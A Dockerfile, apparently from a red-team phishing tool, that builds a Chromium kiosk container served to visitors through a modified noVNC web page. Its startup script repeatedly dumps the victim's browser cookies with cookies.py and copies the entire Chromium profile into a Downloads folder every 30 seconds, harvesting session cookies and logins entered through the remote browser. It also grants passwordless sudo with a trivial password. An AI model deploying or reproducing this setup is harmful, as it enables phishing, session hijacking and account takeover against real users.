FROM alpine

LABEL maintainer="JoelGMSec - https://darkbyte.net"

ENV DISPLAY :0
ENV RESOLUTION 1920x1080x24

RUN apk add sudo bash xfce4 xvfb xdpyinfo lightdm-gtk-greeter x11vnc xfce4-terminal chromium python3 git openssl && \
    ln -s /usr/bin/python3 /usr/bin/python && \
    echo 'CHROMIUM_FLAGS="--disable-gpu --disable-software-rasterizer --disable-dev-shm-usage --kiosk --no-sandbox"' >> /etc/chromium/chromium.conf && \
    dbus-uuidgen > /var/lib/dbus/machine-id

RUN adduser -h /home/user -s /bin/bash -S -D user && echo "user:false" | chpasswd && \
    echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers

USER user
WORKDIR /home/user

RUN mkdir -p /home/user/.vnc && x11vnc -storepasswd false /home/user/.vnc/passwd && \
    git clone https://github.com/novnc/noVNC.git /home/user/noVNC && \
    git clone https://github.com/novnc/websockify /home/user/noVNC/utils/websockify && \
    rm -rf /home/user/noVNC/.git && \
    rm -rf /home/user/noVNC/utils/websockify/.git && \
    sudo apk del git

RUN echo 'export DISPLAY=:0' > /home/user/kiosk.sh && \
    echo 'sudo chmod a-rwx /usr/bin/xfce4-panel' >> /home/user/kiosk.sh && \
    echo 'sudo mkdir Downloads 2> /dev/null && sudo chmod 777 -R Downloads' >> /home/user/kiosk.sh && \
    echo 'sudo mkdir -p /var/run/dbus && sudo dbus-daemon --config-file=/usr/share/dbus-1/system.conf --print-address' >> /home/user/kiosk.sh && \
    echo 'sleep 3 && /usr/bin/chromium-browser $WEBPAGE &' >> /home/user/kiosk.sh && \
    chmod +x /home/user/kiosk.sh

RUN echo '/bin/bash -c /home/user/kiosk.sh &' > /home/user/startVNC.sh && \
    echo 'cp /home/user/noVNC/vnc_lite.html /home/user/noVNC/index.html' >> /home/user/startVNC.sh && \
    echo 'nohup /bin/bash -c "while true ; do sleep 30 ; python3 cookies.py > Downloads/Cookies.txt ; done" &' >> /home/user/startVNC.sh && \    
    echo 'nohup /bin/bash -c "while true ; do sleep 30 ; cp -R /home/user/.config/chromium/Default /home/user/Downloads/ ; done" &' >> /home/user/startVNC.sh && \    
    echo 'sudo rm -f /tmp/.X${DISPLAY#:}-lock' >> /home/user/startVNC.sh && \
    echo 'nohup /usr/bin/Xvfb $DISPLAY -screen 0 $RESOLUTION -ac +extension GLX +render -noreset > /dev/null || true &' >> /home/user/startVNC.sh && \
    echo 'while [[ ! $(xdpyinfo -display $DISPLAY 2> /dev/null) ]]; do sleep .3; done' >> /home/user/startVNC.sh && \
    echo 'nohup startxfce4 > /dev/null || true &' >> /home/user/startVNC.sh && \
    echo 'nohup x11vnc -xkb -noxrecord -noxfixes -noxdamage -many -shared -display $DISPLAY -rfbauth /home/user/.vnc/passwd -rfbport 5900 "$@" &' >> /home/user/startVNC.sh && \
    echo 'nohup /home/user/noVNC/utils/novnc_proxy --vnc localhost:5900 --listen 5980' >> /home/user/startVNC.sh && \
    chmod +x /home/user/startVNC.sh

COPY Files/cookies.py /home/user/
COPY Files/vnc_lite.html /home/user/noVNC/
COPY Files/cursor.js /home/user/noVNC/core/util/
COPY Files/rfb.js /home/user/noVNC/core/
COPY Files/ui.js /home/user/noVNC/app/

ENTRYPOINT ["/bin/bash","-c", "\
            startVNC () { \
                ./startVNC.sh \"$@\"; \
            }; \"$@\"", "foo"]

EXPOSE 5980
CMD ["startVNC"]
